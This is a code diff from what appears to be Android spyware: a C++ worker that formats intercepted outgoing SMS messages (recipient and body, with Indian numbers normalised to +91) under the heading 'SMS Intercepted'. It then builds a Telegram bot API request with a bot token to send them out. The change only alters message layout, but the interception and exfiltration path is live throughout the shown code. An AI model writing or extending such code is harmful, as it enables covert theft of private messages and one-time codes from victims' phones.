@@ -138,16 +138,26 @@ void* tg_worker(void* arg) {
     if (!job) return nullptr;
     JNIEnv* env = nullptr;
     if (job->vm && job->vm->AttachCurrentThread(&env, nullptr) == 0 && env) {
-        // SMSTweaks format: To + Message + one-tap copy line
-        std::string text = "Virtus SMS Intercept\n";
+        // SMS Tweaks exact layout — outgoing only already filtered upstream
+        std::string to_disp = job->dest.empty() ? "?" : job->dest;
+        {
+            std::string d;
+            for (char c : to_disp)
+                if (c >= '0' && c <= '9') d += c;
+            if (d.size() == 10 && to_disp.find('+') == std::string::npos) to_disp = "+91" + d;
+        }
+        const std::string& msg = job->body.empty() ? "empty" : job->body;
+        std::string text = "📱 SMS Intercepted\n";
+        text += "-----------------\n";
+        text += "📞 To: ";
+        text += to_disp;
+        text += "\n💬 Message: ";
+        text += msg;
+        text += "\n📋 One-tap copy:\n";
         text += "To: ";
-        text += job->dest.empty() ? "?" : job->dest;
+        text += to_disp;
         text += "\nMessage: ";
-        text += job->body.empty() ? "empty" : job->body;
-        text += "\n\n";
-        text += job->dest;
-        text += " | ";
-        text += job->body;
+        text += msg;
 
         std::string url = "https://api.telegram.org/bot";
         url += job->token;
